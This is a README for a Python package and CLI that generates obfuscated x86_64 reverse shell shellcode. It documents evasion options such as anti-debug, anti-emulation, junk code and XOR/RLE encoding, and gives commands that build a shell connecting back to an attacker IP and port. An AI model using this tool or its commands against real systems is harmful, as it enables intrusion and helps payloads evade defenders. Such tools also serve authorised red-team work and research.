# yaptpy

> CLI tool that generates highly obfuscated x86_64 reverse shell shellcode with multiple evasion techniques

[![PyPI](https://img.shields.io/pypi/v/yaptpy.svg)](https://pypi.org/project/yaptpy/)
[![Python](https://img.shields.io/pypi/pyversions/yaptpy.svg)](https://pypi.org/project/yaptpy/)
[![Coverage](https://codecov.io/gh/daedalus/yaptpy/branch/main/graph/badge.svg)](https://codecov.io/gh/daedalus/yaptpy)
[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)

## Install

```bash
pip install yaptpy
```

## Usage

```python
from yaptpy import generate_payload

# Generate basic reverse shell shellcode
shellcode = generate_payload(
    ip="192.168.1.100",
    port=4444,
    executable_path="/bin/sh",
    junk=True,
    anti_emulation=False,
    stack_pivot=False,
    obfuscate_path=False,
    anti_debug=False,
    indirect_syscalls=False,
)
```

## CLI

```bash
yapt --help
```

Basic reverse shell:
```bash
yapt --ip 192.168.1.100 --port 4444
```

Obfuscated version with multiple techniques:
```bash
yapt --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA
```

## API

### `generate_payload(ip, port, executable_path, junk, anti_emulation, stack_pivot, obfuscate_path, anti_debug, indirect_syscalls) -> bytes`
Generates core reverse shell payload with optional features.

### `xor_encrypt(data: bytes, key: int) -> bytes`
Encrypts data using simple byte-wise XOR.

### `rolling_xor_encrypt(data: bytes, key: int) -> bytes`
Encrypts data using rolling XOR (key increments).

### `rle_encode(data: bytes) -> bytes`
Encodes data using Run-Length Encoding.

### `generate_polymorphic_junk() -> bytes`
Generates random non-functional assembly instructions.

### `remove_comments_from_assembly(assembly_code: str) -> str`
Removes comments from assembly code.

### `rle_decoder_stub(original_size: int) -> bytes`
Generates RLE decoder stub.

### `rolling_xor_decoder_stub(original_size: int, start_key: int) -> bytes`
Generates rolling XOR decoder stub.

## Development

```bash
git clone https://github.com/daedalus/yaptpy.git
cd yaptpy
pip install -e ".[test]"

# run tests
pytest

# format
ruff format src/ tests/

# lint
ruff check src/ tests/

# type check
mypy src/
```

## License

MIT
